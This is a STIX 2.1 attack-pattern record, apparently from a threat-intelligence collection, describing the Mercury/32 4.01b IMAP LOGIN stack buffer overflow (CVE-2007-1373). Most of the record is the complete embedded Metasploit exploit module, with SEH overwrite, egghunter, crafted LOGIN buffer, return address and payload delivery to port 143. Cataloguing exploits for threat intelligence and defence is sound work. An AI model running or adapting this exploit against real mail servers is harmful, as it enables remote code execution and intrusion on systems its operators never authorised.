{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e97b7a35-abe9-4f39-9a27-7ac3bc5a45ac",
    "created": "2024-08-14T16:47:44.67011Z",
    "modified": "2024-08-14T16:47:44.670114Z",
    "name": "Mercury/32 4.01 IMAP LOGIN SEH Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Mercury/32 <= 4.01b IMAPD LOGIN verb. By sending a specially crafted login command, a buffer is corrupted, and code execution is possible. This vulnerability was discovered by (mu-b at digit-labs.org). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mercury_login.rb",
            "external_id": "mercury_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1373"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Mercury/32 4.01 IMAP LOGIN SEH Buffer Overflow',\n      'Description' => %q{\n        This module exploits a stack buffer overflow in Mercury/32 <= 4.01b IMAPD\n        LOGIN verb. By sending a specially crafted login command, a buffer\n        is corrupted, and code execution is possible. This vulnerability was\n        discovered by (mu-b at digit-labs.org).\n      },\n      'Author'         =>\n        [\n        'mu-b', # Discovery and exploit\n        'MC', # Metasploit module\n        'Ivan Racic' # Automatic targeting + egg hunter\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-1373'],\n          ['EDB', '3418']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'Space' => 2500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows Universal',\n            {\n              'Ret' => 0x00401460\n            }]\n          ],\n        'DisclosureDate' => '2007-03-06',\n        'DefaultTarget'  => 0))\n    register_options(\n      [\n        Opt::RPORT(143)\n      ]\n    )\n  end\n\n  def check\n    connect\n    resp = sock.get_once\n    disconnect\n    return CheckCode::Vulnerable if resp =~ %r{Mercury/32 v4\\.01[ab]}\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    hunter, egg = generate_egghunter(payload.encoded)\n    connect\n    sock.get_once\n    num = rand(255).to_i\n    sploit = 'A001 LOGIN ' + \"\\x20\" * 1008 + \"{#{num}}\\n\"\n    sploit << rand_text_alpha_upper(347)\n    sploit << egg + payload.encoded\n    sploit << rand_text_alpha_upper(7500 - payload.encoded.length - egg.length)\n    sploit << \"\\x74\\x06\\x75\\x04\" + [target.ret].pack('V')\n    sploit << make_nops(20)\n    sploit << hunter\n    sock.put(sploit)\n    sock.get_once\n    print_status(\"Sending payload (#{sploit.length} bytes) ...\")\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-06",
    "x_mitre_platforms": [
        "win'"
    ]
}